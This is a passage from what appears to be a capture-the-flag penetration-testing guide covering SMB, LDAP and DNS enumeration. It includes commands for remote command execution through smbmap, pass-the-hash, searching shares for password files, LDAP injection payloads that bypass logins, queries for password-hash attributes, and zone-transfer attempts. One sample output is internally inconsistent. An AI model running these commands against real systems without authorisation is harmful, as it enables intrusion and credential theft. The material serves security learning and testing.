smbmap -H <target> -u username -p password --upload '/local/file.txt' 'share\file.txt'
```

**Execute commands:**

```bash
smbmap -H <target> -u username -p password -x 'ipconfig'
smbmap -H <target> -u username -p password -x 'net user'
```

**Search for files:**

```bash
smbmap -H <target> -u username -p password -F pattern
smbmap -H <target> -u username -p password -F 'password'
smbmap -H <target> -u username -p password -F '\.config'
```

**Scan multiple hosts:**

```bash
smbmap -H <target> -u username -p password --host-file targets.txt
```

**Pass-the-hash:**

```bash
smbmap -H <target> -u username -p 'aad3b435b51404eeaad3b435b51404ee:hash'
```

**Drive listing:**

```bash
smbmap -H <target> -u username -p password -L  # List drives
smbmap -H <target> -u username -p password -r 'C$'  # Browse C drive
```

**Permission analysis:**

smbmap automatically shows permissions (READ, WRITE, NO ACCESS) for each share:

```bash
smbmap -H <target> -u username -p password
```

Output format:

```
[+] IP: <target>:<port>    Name: hostname
        Disk                Permissions    Comment
        ----                -----------    -------
        ADMIN$              NO ACCESS      Remote Admin
        C$                  NO ACCESS      Default share
        IPC$                READ ONLY      Remote IPC
        Share               READ, WRITE    Custom share
```

### nbtstat Enumeration

nbtstat is a Windows-native tool for NetBIOS over TCP/IP statistics. Linux equivalent is `nmblookup`.

**Linux NetBIOS enumeration (nmblookup):**

```bash
nmblookup -A <target>
nbtscan <target>
nbtscan -r <network>/24
```

**Using Nmap for NetBIOS enumeration:**

```bash
nmap -sU -sV -p 137 --script nbstat <target>
nmap -sU -p 137 --script nbstat.nse <target>
```

**NetBIOS name query:**

```bash
nmblookup -A <target>
```

Output includes:

- Computer name
- Workgroup/domain
- MAC address
- Service types (<00>, <03>, <20>)

**NetBIOS name codes:**

- `<00>`: Workstation service
- `<03>`: Messenger service (username)
- `<20>`: File server service
- `<1B>`: Domain master browser
- `<1D>`: Master browser

**Using nbtscan for subnet sweeps:**

```bash
nbtscan 192.168.1.0/24
nbtscan -r 10.10.10.0/24  # Recursive
nbtscan -v 192.168.1.0/24  # Verbose
```

**enum4linux NetBIOS enumeration:**

```bash
enum4linux -n <target>  # NetBIOS names
```

### Share Enumeration and Permissions

**Null session enumeration:**

Null sessions exploit legacy Windows configurations that allow anonymous connections:

```bash
smbclient -L //<target> -N
smbclient //<target>/IPC$ -N
enum4linux -a -u "" -p "" <target>
smbmap -H <target> -u null
```

**Guest account enumeration:**

```bash
smbclient -L //<target> -U guest%
smbmap -H <target> -u guest -p ""
crackmapexec smb <target> -u 'guest' -p ''
```

**Identifying writable shares:**

```bash
smbmap -H <target> -u username -p password | grep 'READ, WRITE'
```

**Testing share access:**

```bash
smbclient //<target>/share -U username%password -c "ls; exit"
```

**Enumerating share permissions with crackmapexec:**

```bash
crackmapexec smb <target> -u username -p password --shares
crackmapexec smb <target> -u username -p password --shares --filter-shares READ WRITE
```

**Identifying hidden shares:**

Shares ending with `$` are typically hidden administrative shares:

```bash
smbmap -H <target> -u username -p password | grep '\$$'
```

**Permission testing methodology:**

1. Attempt null session:

```bash
smbmap -H <target> -u null
```

2. Try guest account:

```bash
smbmap -H <target> -u guest -p ""
```

3. Test common credentials:

```bash
smbmap -H <target> -u administrator -p password
```

4. Enumerate accessible shares:

```bash
smbclient -L //<target> -U username%password
```

5. Test write permissions:

```bash
smbclient //<target>/share -U username%password -c "mkdir test; rmdir test"
```

**Common misconfigurations to check:**

- World-readable shares
- Guest-accessible shares
- Writable shares without authentication
- Shares containing sensitive files (passwords, configs)
- Shares with misconfigured ACLs

**Extracting useful information from shares:**

```bash
# Search for passwords
smbmap -H <target> -u user -p pass -R --depth 5 -A 'password|pass|pwd'

# Search for configuration files
smbmap -H <target> -u user -p pass -R -A '\.conf|\.config|\.xml'

# Search for scripts
smbmap -H <target> -u user -p pass -R -A '\.ps1|\.bat|\.sh'
```

**Using rpcclient for detailed enumeration:**

```bash
rpcclient -U "" -N <target>
rpcclient -U "username%password" <target>
```

Interactive rpcclient commands:

```bash
srvinfo              # Server info
enumdomusers         # Domain users
enumdomgroups        # Domain groups
queryuser 0x1f4      # Query specific user (RID 500 = Administrator)
querygroup 0x200     # Query specific group
getdompwinfo         # Password policy
netshareenum         # Share enumeration
netsharegetinfo share # Get share info
lsaenumsid           # Enumerate SIDs
```

**SMB relay and credential capture considerations:**

[Inference] If SMB signing is not required, the target may be vulnerable to SMB relay attacks, which could be exploited using tools like Responder and ntlmrelayx.

**Checking SMB signing:**

```bash
nmap -p 445 --script smb-security-mode <target>
crackmapexec smb <target> --gen-relay-list relay_targets.txt
```

**Important related topics for CTF scenarios:**

- Pass-the-hash attacks using captured NTLM hashes
- SMB relay attacks for privilege escalation
- Exploiting known SMB vulnerabilities (EternalBlue, SMBGhost)
- Kerberos authentication and ticket manipulation
- NTLM hash cracking and analysis

---

## LDAP Enumeration

### ldapsearch

**ldapsearch** is the primary tool for querying LDAP directories. It retrieves directory information through structured queries and supports anonymous and authenticated access.

Basic anonymous connection to discover directory structure:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -s base -b "" namingContexts
```

Parameters explained: `-h` specifies host, `-p` specifies port (389 for unencrypted LDAP, 636 for LDAPS), `-x` enables simple authentication (required for anonymous), `-s base` specifies search scope (base searches root only), `-b` specifies base distinguished name (empty string searches root), and the final parameter specifies the attribute to return.

The `namingContexts` attribute reveals available partitions in the directory. Common results include `dc=example,dc=com` or `cn=schema`. This forms the foundation for subsequent enumeration.

List all domains if multiple partitions exist:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -s base -b "" "(objectClass=*)" namingContexts
```

Enumerate directory root object:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -s base -b "dc=example,dc=com" -z 0
```

The `-z 0` parameter removes result size limits (critical for large directories). Without this, results may be truncated. Return all attributes:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" -z 0
```

This returns all objects and attributes within the specified base DN.

Enumerate users specifically:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=user)" -z 0
```

This searches for all objects with `objectClass=user`. Filter by specific attributes:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName mail displayName
```

This returns only the specified attributes (sAMAccountName, mail, displayName) for each user, reducing output volume. Extract only usernames:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=user)" sAMAccountName | grep sAMAccountName | cut -d: -f2 | sort -u
```

Enumerate groups:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=group)" sAMAccountName members -z 0
```

The `members` attribute lists group membership. Enumerate computers:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=computer)" sAMAccountName operatingSystem
```

Test LDAPS (encrypted LDAP on port 636):

```bash
ldapsearch -h 192.168.1.100 -p 636 -x -Z -b "dc=example,dc=com" -z 0
```

The `-Z` flag initiates TLS. If the server uses LDAPS (implicit TLS), omit `-Z`:

```bash
ldapsearch -H ldaps://192.168.1.100:636 -x -b "dc=example,dc=com" -z 0
```

The `-H` parameter accepts URIs with protocol specification. Test non-standard ports:

```bash
ldapsearch -H ldap://192.168.1.100:3268 -x -b "dc=example,dc=com" -z 0
```

Port 3268 is the global catalog port for Active Directory, which may accept queries even if port 389 is filtered.

### LDAP Injection Testing

LDAP injection occurs when user input is incorporated into LDAP queries without sanitization. [Inference] Similar to SQL injection, LDAP injection allows attackers to modify query logic and retrieve unauthorized data.

Basic LDAP injection vulnerability in authentication scenarios. A typical vulnerable query structure:

```
(&(uid=USERNAME)(userPassword=PASSWORD))
```

Injecting `*` into the username field:

```
login: *
password: anything
```

Results in query:

```
(&(uid=*)(userPassword=anything))
```

This returns the first user in the directory regardless of password. The `*` acts as a wildcard matching any value.

Testing with ldapsearch to simulate injection:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(&(uid=*)(userPassword=*))" -z 0
```

This query bypasses authentication validation and returns all user objects.

Extracting specific user information through injection. Query structure:

```
(&(uid=admin*)(userPassword=*))
```

This returns the first user whose username starts with "admin". Modified ldapsearch:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(&(uid=admin*)(userPassword=*))" -z 0
```

Boolean-based LDAP injection enumerates character-by-character. Testing if username contains "admin":

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(&(uid=*admin*)(userPassword=*))" -z 0
```

If results appear, "admin" is in the directory. Narrowing down: `admin*` returns users starting with "admin", `*admin*` returns all containing "admin", `*admin` returns those ending with "admin".

Filter manipulation through injection. Original query:

```
(|(uid=USERINPUT)(mail=USERINPUT))
```

Injecting `*))(&(mail=*` into username field:

```
(|(uid=*))(&(mail=*)(mail=USERINPUT))
```

This transforms OR logic to AND logic, changing query semantics. In ldapsearch simulation:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(|(uid=*))(&(mail=*)(mail=anything))" -z 0
```

Testing attribute name injection. If a parameter contains attribute names:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(&(ATTRIBUTE_INJECTION=*)(uid=test))" -z 0
```

[Inference] Successful attribute injection reveals custom attributes and directory structure through error messages or return values.

Time-based LDAP injection (blind injection). Some LDAP implementations support timeout-based detection. The `timeout` operator (non-standard) may cause delayed responses:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(&(uid=*)(|(timeout=*))(userPassword=*))" -z 0
```

[Unverified] Support for timeout operators varies significantly across LDAP implementations; this technique's effectiveness is not guaranteed.

Automation of LDAP injection testing with wfuzz:

```bash
wfuzz -u "ldap://192.168.1.100:389/cn=FUZZ,dc=example,dc=com" -w payloads.txt
```

Where `payloads.txt` contains injection strings like `*`, `*)(uid=*`, `*))(|(uid=*`.

### Anonymous Binding

Anonymous binding tests whether the LDAP server permits unauthenticated access. Basic anonymous connection attempt:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" -z 0
```

The `-x` flag specifies simple authentication, and omitting credentials results in anonymous binding. [Inference] Successful anonymous queries indicate the directory permits unrestricted enumeration.

Check anonymous binding capability explicitly:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "" -s base "(objectClass=*)" rootDSE
```

The `rootDSE` object provides server information. If accessible anonymously, the server allows anonymous binding.

Query supportedControl attribute to identify LDAP features:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "" -s base "(objectClass=*)" supportedControl
```

This reveals pagination control support, which enables bypassing result limits for large result sets.

Test directory information tree (DIT) visibility:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" -s sub "(objectClass=*)" -z 0
```

The `-s sub` parameter searches the entire subtree. Successful enumeration of many objects indicates anonymous access to sensitive data.

Enumerate organizational units (OUs):

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=organizationalUnit)" ou -z 0
```

OUs often organize users, groups, and resources, revealing administrative structure. If anonymously enumerable, attackers understand infrastructure organization.

Enumerate contacts and distribution lists:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=contact)" mail displayName
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=distributionList)" mail members
```

Test for confidential attributes through anonymous access. Attributes that should require authentication:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=user)" unicodePwd lmHash nTHash
```

[Inference] Password hashes (unicodePwd, lmHash) should not be retrievable anonymously; their presence indicates directory misconfiguration.

Attempt credential enumeration despite anonymous access:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(objectClass=user)" userAccountControl pwdLastSet lastLogon
```

These attributes reveal account status and activity history, enabling targeted attacks against active accounts.

### Schema Enumeration

LDAP schema defines valid object classes, attributes, and constraints. Enumerate schema objects:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" -z 0
```

This returns all schema objects including object class definitions and attribute types. Extract object classes only:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" "(objectClass=classSchema)" cn lDAPDisplayName -z 0
```

Properties: `cn` (common name), `lDAPDisplayName` (LDAP name for the object class).

Extract attribute types:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" "(objectClass=attributeSchema)" lDAPDisplayName attributeSyntax isSingleValued -z 0
```

Properties include: `lDAPDisplayName`, `attributeSyntax` (data type), `isSingleValued` (whether only one value is permitted).

Identify custom attributes (non-standard Active Directory additions):

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" "(lDAPDisplayName=*custom*)" -z 0
```

Custom attributes often contain organizational-specific data. For example, custom attributes might store employee IDs, office locations, or sensitive classification data.

Enumerate extended object classes used in the directory:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "dc=example,dc=com" "(&(objectClass=*)(!(objectClass=top)))" objectClass -z 0 | sort -u
```

This returns all object classes in use, revealing the directory's data model.

Discover schema replication metadata (indicates directory replication topology):

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" "(cn=*)" schemaIDGUID -z 0
```

Schema objects with `schemaIDGUID` are standardized; custom objects lack this attribute. Identify Active Directory functional level through schema:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" "(cn=objectVersion)" objectVersion -z 0
```

objectVersion values indicate AD version: 0 (2000), 1 (2003), 10 (2008), 11 (2008 R2), 13 (2012), 15 (2012 R2), 16 (2016), 17 (2016/2019 hybrid).

Extract schema modifications timestamps:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=example,dc=com" "(cn=*)" whenChanged whenCreated -z 0
```

This reveals schema evolution history. Recent modifications may indicate new features or custom integrations.

Analyze schema differences between forest partitions:

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=forest1,dc=com" "(objectClass=attributeSchema)" lDAPDisplayName > forest1_schema.txt
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=schema,cn=configuration,dc=forest2,dc=com" "(objectClass=attributeSchema)" lDAPDisplayName > forest2_schema.txt
diff forest1_schema.txt forest2_schema.txt
```

Schema differences between forests reveal distinct organizational boundaries or legacy system integration.

Extract schema extended rights (permissions framework):

```bash
ldapsearch -h 192.168.1.100 -p 389 -x -b "cn=extended-rights,cn=configuration,dc=example,dc=com" "(cn=*)" displayName rightsGUID -z 0
```

Extended rights define operations requiring elevated permissions. [Inference] Enumerating extended rights reveals the directory's access control model and potentially unintended privilege combinations.

Related topics for expanded coverage: Active Directory-specific enumeration (trusts, replication), LDAP relay attacks, credential harvesting through directory queries, and schema-based privilege escalation.

---

## DNS Enumeration

### dig (Domain Information Groper)

`dig` is the primary tool for DNS queries, offering granular control over query types, nameservers, and response parsing. Standard in most Linux distributions and Kali Linux.

**Basic DNS query:**

```bash
dig example.com
```

Returns A records (IPv4 addresses) by default. Output includes:

- QUESTION SECTION — query parameters
- ANSWER SECTION — resolved records
- AUTHORITY SECTION — authoritative nameservers
- ADDITIONAL SECTION — supplementary information

**Query specific record types:**

```bash
dig example.com A          # IPv4 addresses
dig example.com AAAA       # IPv6 addresses
dig example.com MX         # Mail servers
dig example.com NS         # Nameservers
dig example.com TXT        # Text records (SPF, DKIM, DMARC)
dig example.com CNAME      # Canonical name aliases
dig example.com SOA        # Start of Authority (zone information)
dig example.com PTR        # Reverse DNS
```

**Query all record types:**

```bash
dig example.com ANY
```

Returns all available DNS records for the domain. [Unverified] Modern DNS servers may rate-limit or refuse ANY queries due to DNS amplification attack mitigation.

**AXFR (Zone Transfer) queries:**

```bash
dig @ns1.example.com example.com AXFR
```

Parameters:

- `@ns1.example.com` — Specifies authoritative nameserver
- `AXFR` — Initiates zone transfer request

**Successful zone transfer output:**

```
; <<>> DiG 9.x.x <<>> @ns1.example.com example.com AXFR
; Transfer failed.
```

OR (if misconfigured):

```
example.com.        3600    IN  SOA  ns1.example.com. admin.example.com. ...
example.com.        3600    IN  NS   ns1.example.com.
example.com.        3600    IN  A    192.168.1.1
mail.example.com.   3600    IN  A    192.168.1.2
www.example.com.    3600    IN  A    192.168.1.3
ftp.example.com.    3600    IN  A    192.168.1.4
```

**Zone transfer interpretation:**

- Successful transfer reveals all internal hostnames and IP addresses
- Indicates misconfigured access controls (zone transfers should be restricted to secondary nameservers)
- [Unverified] Modern DNS servers typically deny zone transfers to non-authoritative clients; successful transfers indicate legacy configuration or intentional CTF challenge setup

**Reverse DNS lookup:**

```bash
dig -x 192.168.1.1
```

Queries PTR records to resolve IP to hostname. Returns host information if reverse zone configured.

**Query specific nameserver:**

```bash
dig @8.8.8.8 example.com A
```

Uses Google's public DNS (8.8.8.8) instead of system default resolver. Useful for:

- Bypassing local DNS filters
- Comparing responses across different nameservers
- Detecting DNS poisoning (responses differ between servers)

**Short output format:**

```bash
dig example.com +short
```

Returns only answer section, stripping QUESTION, AUTHORITY, and ADDITIONAL sections. Compact format suitable for piping to other tools.

**Trace DNS resolution path:**

```bash
dig example.com +trace
```

Shows recursive resolution from root nameservers through intermediate nameservers to authoritative server. Reveals:

- Root nameserver response
- TLD nameserver delegation
- Authoritative nameserver final answer
- Network topology inference

**Output example:**

```
.                       518400  IN  NS  a.root-servers.net.
com.                    172800  IN  NS  a.gtld-servers.net.
example.com.            3600    IN  NS  ns1.example.com.
example.com.            3600    IN  A   192.168.1.1
```

**Multiple queries from file:**

```bash
dig -f hostnames.txt +short
```

Batch query multiple domains from text file (one domain per line). Output format:

```
domain1.com.        300     IN  A   192.168.1.1
domain2.com.        300     IN  A   192.168.1.2
```

**Query performance analysis:**

```bash
dig example.com +stats
```

Appends query statistics showing query time, server contacted, and response flags.

**Context-specific applications:**

- **Subdomain discovery:** Combine with wordlists (detailed below in comprehensive workflows)
- **Mail server identification:** MX queries reveal `mail.example.com`, `mail2.example.com`, etc.
- **TXT record harvesting:** SPF, DKIM, DMARC records may reveal infrastructure details
- **TTL analysis:** Low TTL values suggest frequently updated records or DNS-based load balancing

**Example CTF scenario:**

```bash
# Comprehensive DNS enumeration with dig
dig example.com ANY +short
dig @ns1.example.com example.com AXFR
dig example.com MX
dig example.com TXT
dig example.com +trace
```

---

### nslookup (Interactive Mode)

`nslookup` provides interactive DNS queries with nameserver switching and batch capabilities. Syntax simpler than `dig` but less detailed output.

**Interactive mode:**

```bash
nslookup
> server ns1.example.com     # Switch to specific nameserver
> set type=MX                # Set query type
> example.com                # Query domain
> set type=A
> mail.example.com
> exit
```

**Non-interactive single query:**

```bash
nslookup example.com
nslookup example.com 8.8.8.8    # Query via specific nameserver
```

**Query specific record types:**

```bash
nslookup -type=MX example.com
nslookup -type=TXT example.com
nslookup -type=NS example.com
```

**Reverse DNS query:**

```bash
nslookup 192.168.1.1
```

**Query all record types:**

```bash
nslookup -type=ANY example.com
```

**Interactive zone transfer attempt:**

```bash
nslookup
> server ns1.example.com
> ls -d example.com          # List domain records (zone transfer equivalent)
```

**Output comparison (dig vs nslookup):**

`dig` output:

```
; <<>> DiG 9.x.x <<>> example.com MX
;; QUESTION SECTION:
;example.com.                   IN  MX
;; ANSWER SECTION:
example.com.            3600    IN  MX  10 mail.example.com.
```

`nslookup` output:

```
example.com nameserver = ns1.example.com
example.com nameserver = ns2.example.com
example.com mail exchanger = 10 mail.example.com
```

[Unverified] `nslookup` considered deprecated by ISC (Internet Systems Consortium); `dig` preferred for scripting and automation.

**Context-specific applications:**

- **Interactive exploration:** Real-time switching between nameservers and query types without command reformulation
- **Batch scripting:** Pipe multiple commands for sequential lookups
- **Learning tool:** Simpler syntax than dig; useful for understanding DNS fundamentals

**Example CTF scenario:**

```bash
nslookup
> set type=NS
> example.com
> server ns1.example.com
> set type=AXFR
> example.com
> ls -d example.com
```

---

### dnsenum

`dnsenum` automates DNS enumeration combining multiple techniques: zone transfers, wordlist-based subdomain brute-forcing, reverse DNS, and record extraction.

**Basic enumeration:**

```bash
dnsenum example.com
```

Performs default enumeration: zone transfer attempt, AXFR queries to all discovered nameservers, and basic record queries.

**With subdomain brute-forcing:**

```bash
dnsenum example.com --enum
```

Enables subdomain discovery using internal wordlist.

**Custom wordlist:**

```bash
dnsenum example.com -f /usr/share/wordlists/subdomains-top1million-5000.txt
```

Brute-forces subdomains against specified wordlist. Process:

1. Attempts AXFR transfer from each nameserver
2. Queries SOA, NS, MX, A records
3. Iterates through wordlist performing A/AAAA lookups for each subdomain
4. Performs reverse DNS on discovered IP ranges

**Output verbosity:**

```bash
dnsenum example.com -v
```

Verbose output showing each lookup attempt and response.

**DNS server specification:**

```bash
dnsenum example.com -d ns1.example.com
```

Queries specific nameserver instead of default resolver.

**Output to file:**

```bash
dnsenum example.com -o dns_results.txt
```

Saves enumeration results in structured format for analysis.

**Thread control:**

```bash
dnsenum example.com --threads 10
```

Controls parallel thread count for brute-forcing (default 5). Higher values increase speed but may trigger rate limiting.

**Context-specific applications:**

- **Quick reconnaissance:** Single command combines multiple enumeration techniques
- **Automated zone transfer detection:** Checks all discovered nameservers for misconfigured transfers
- **Subdomain discovery:** Wordlist-based enumeration identifies hosting subdomains, CDN endpoints, internal systems

**Example CTF scenario:**

```bash
dnsenum example.com -f /usr/share/wordlists/subdomains-top1million-5000.txt -o dns_enum.txt -v
```

---

### dnsmap

Lightweight DNS subdomain brute-forcing tool using built-in or custom wordlists. Faster and simpler than full enumeration suites.

**Basic subdomain brute-force:**

```bash
dnsmap example.com
```

Performs A record lookups for common subdomains from built-in wordlist (~1,000 entries).

**Custom wordlist:**

```bash
dnsmap example.com -w /path/to/wordlist.txt
```

Iterates through custom wordlist of subdomains.

**Ignore wildcard results:**

```bash
dnsmap example.com -i
```

Ignores wildcard DNS responses (common when domain has wildcard A record pointing all subdomains to single IP). [Unverified] Wildcard filtering may eliminate legitimate subdomains if configured overly aggressively.

**Delay between requests:**

```bash
dnsmap example.com -d 10
```

Adds 10ms delay between DNS queries to avoid rate limiting or detection.

**Output to file:**

```bash
dnsmap example.com -o results.txt
```

**Parallel execution (via shell):**

```bash
for domain in example.com test.com; do dnsmap $domain -o ${domain}_results.txt & done
wait
```

Executes multiple dnsmap instances in parallel against different domains.

**Context-specific applications:**

- **Stealth reconnaissance:** Lower profile than full enumeration suites; minimal resource consumption
- **Real-time results:** Outputs discovered subdomains immediately during execution
- **Scripting:** Simple output format easily parsed by custom scripts

**Example CTF scenario:**

```bash
dnsmap example.com -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -d 5 -o subdomains.txt
```

---

### fierce

Advanced subdomain discovery tool combining WHOIS queries, zone transfer attempts, and DNS brute-forcing with intelligent filtering.

**Basic enumeration:**

```bash
fierce --domain example.com
```

Performs default scan: zone transfer attempts, SOA queries, nameserver discovery, and basic brute-forcing.

**Custom wordlist:**

```bash
fierce --domain example.com --wordlist /path/to/wordlist.txt
```

Brute-forces using specified wordlist.

**Specific nameserver:**

```bash
fierce --domain example.com --nameserver ns1.example.com
```

Queries specified nameserver instead of default resolver.

**Subdomain range:**

```bash
fierce --domain example.com --range 1-254
```

Attempts reverse DNS on IP range (if domain uses contiguous IP space). Specifying range 1-254 queries 192.168.1.0/24 format addresses.

**Search for subdomains near discovered IPs:**

```bash
fierce --domain example.com --search
```

After discovering IPs, performs reverse DNS lookups to find additional hostnames.

**Delay between requests:**

```bash
fierce --domain example.com --delay 0.5
```

Adds 0.5-second delay between queries for stealth.

**Full zone transfer attempt:**

```bash
fierce --domain example.com --full
```

Forces zone transfer attempts before brute-forcing (default behavior).

**Output in different formats:**

```bash
fierce --domain example.com --output results.xml
fierce --domain example.com --output results.json
```

**Verbose output:**

```bash
fierce --domain example.com -v
```

Displays each resolution attempt and response.

**Context-specific applications:**

- **Comprehensive mapping:** Combines multiple techniques (WHOIS, zone transfers, brute-forcing, reverse DNS) in single tool
- **IP range discovery:** Identifies contiguous IP spaces hosting subdomains
- **Intelligent filtering:** Removes false positives from wildcard responses more effectively than simple tools
- **CTF optimization:** Focuses on likely internal subdomains through smart wordlist prioritization

**Example CTF scenario:**

```bash
fierce --domain example.com --wordlist /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --full --delay 0.2 -v
```

---

### DNSSEC Analysis

DNSSEC (DNS Security Extensions) adds cryptographic signatures to DNS records. Analysis reveals security posture and potential validation bypass opportunities.

**Validate DNSSEC signatures:**

```bash
dig example.com +dnssec +short
```

Queries with DNSSEC validation enabled. Output includes RRSIG (resource record signature) records if DNSSEC configured.

**Check DNSSEC DS (Delegation Signer) records:**

```bash
dig example.com DS
```

Returns DS records used for delegating DNSSEC authority to subdomains.

**Retrieve DNSKEY records:**

```bash
dig example.com DNSKEY
```

Returns public keys used for DNSSEC signature validation. Output includes:

- Zone Signing Key (ZSK) — signs record RRsets
- Key Signing Key (KSK) — signs ZSK

**DNSSEC validation status:**

```bash
dig example.com +dnssec | grep -i "ad\|rrsig"
```

- `ad` flag in response indicates DNSSEC validated
- `RRSIG` records indicate DNSSEC signatures present

**Check DNSSEC chain of trust:**

```bash
dig example.com +trace +dnssec
```

Traces DNSSEC validation through root nameservers, TLD servers, and authoritative servers, showing signature verification at each level.

**dnsviz for DNSSEC visualization:**

```bash
dnsviz auth -d example.com | dnsviz graph -o dnssec_status.png
```

Generates visual representation of DNSSEC chain. [Unverified] May not be installed by default; requires separate installation.

**DNSSEC vulnerability indicators:**

**Weak key sizes (< 2048 bits RSA):**

```bash
dig example.com DNSKEY | grep "256 3"
```

Returns DNSKEY records; check key size in hex output (time-intensive manual analysis).

**Missing RRSIG records:**

```bash
dig @ns1.example.com example.com ANY | grep -c "RRSIG"
```

Returns zero if signatures missing (indicates DNSSEC improperly configured or disabled).

**Invalid signatures (DNSSEC validation failure):**

```bash
dig example.com +dnssec | grep "status:"
```

May return `SERVFAIL` if signature validation fails, indicating:

- Misconfigured DNSSEC on server
- Expired ZSK/KSK
- Man-in-the-middle modification
- [Unverified] Potential DNSSEC validation bypass

**Context-specific applications:**

- **Security assessment:** Determine if domain has DNSSEC enabled and properly configured
- **Zone hopping detection:** DS record analysis reveals subdomain DNSSEC delegation hierarchy
- **Key management audit:** Identify weak key sizes or expired keys
- **Validation bypass:** [Speculation] Improperly configured DNSSEC may allow DNS hijacking if validation can be circumvented

**Example CTF scenario:**

```bash
# Complete DNSSEC analysis
dig example.com +dnssec +short
dig example.com DS
dig example.com DNSKEY
dig example.com +trace +dnssec
dnsviz auth -d example.com | dnsviz graph -o dnssec_analysis.png
```

---

### DNS Zone Transfers

Zone transfers (AXFR queries) are intended to replicate DNS zones between authoritative nameservers. Misconfigured access controls allow unauthorized clients to retrieve entire zone data.

**Zone transfer fundamentals:**

AXFR (Asynchronous Full Transfer) is DNS zone replication protocol. Proper configuration restricts transfers to secondary nameservers only; misconfiguration allows any client to request zone data.

**Zone transfer attempt via dig:**

```bash
dig @ns1.example.com example.com AXFR
```

**Successful transfer output (misconfigured server):**

```
; <<>> DiG 9.x.x <<>> @ns1.example.com example.com AXFR
; Transfer of domain example.com requested
; Transfer failed
```

OR:

```
example.com.            3600    IN  SOA  ns1.example.com. hostmaster.example.com. (...)
example.com.            3600    IN  NS   ns1.example.com.
example.com.            3600    IN  NS   ns2.example.com.
example.com.            3600    IN  A    192.168.1.1
www.example.com.        3600    IN  A    192.168.1.2
mail.example.com.       3600    IN  A    192.168.1.3
ftp.example.com.        3600    IN  A    192.168.1.4
admin.example.com.      3600    IN  A    192.168.1.5
internal.example.com.   3600    IN  A    10.0.0.1
(... additional records ...)
example.com.            3600    IN  SOA  ns1.example.com. hostmaster.example.com. (...)
```

**Parse zone transfer output:**

```bash
dig @ns1.example.com example.com AXFR | grep "IN" | awk '{print $1, $5}'
```

Extracts hostname and IP pairs from zone transfer for analysis.

**Zone transfer from nslookup:**

```bash
nslookup
> server ns1.example.com
> ls -d example.com
```

Alternative syntax for zone transfer using nslookup's `ls` command.

**Batch zone transfer testing:**

```bash
for ns in $(dig @ns1.example.com example.com NS +short); do
  echo "Testing $ns..."
  dig @$ns example.com AXFR | head -n 5
done
```

Attempts zone transfer from each discovered nameserver sequentially.

**Zone transfer via host command:**

```bash
host -l example.com ns1.example.com
```

Simplified syntax for zone transfer (if available; behavior depends on system configuration).

**Save zone transfer to file:**

```bash
dig @ns1.example.com example.com AXFR > zone_transfer.txt
```

Preserves complete zone data for offline analysis, subdomain harvesting, and vulnerability assessment.

**Zone transfer information extraction:**

Successful zone transfer reveals:

1. **Complete subdomain mapping:** All internal and external hostnames
2. **IP address ranges:** Contiguous internal and external IPs
3. **Mail server topology:** Mail relay and backup mail server identification
4. **Service endpoints:** Database servers, API servers, admin interfaces
5. **Internal network structure:** Private IP ranges (10.x.x.x, 172.16.x.x, 192.168.x.x) hint at internal architecture

**Zone transfer data analysis workflow:**

```bash
# Capture zone transfer
dig @ns1.example.com example.com AXFR > zone.txt

# Extract only hostnames
grep "IN" zone.txt | awk '{print $1}' | sort -u > hostnames.txt

# Extract only IP addresses
grep "IN.*A\s" zone.txt | awk '{print $NF}' | sort -u > ips.txt

# Identify potential internal systems
grep "10\.0\|172\.16\|192\.168" ips.txt > internal_ips.txt

# Extract mail servers
grep "MX" zone.txt

# Extract other services
grep -E "CNAME|SRV" zone.txt
```

**CTF-specific zone transfer indicators:**

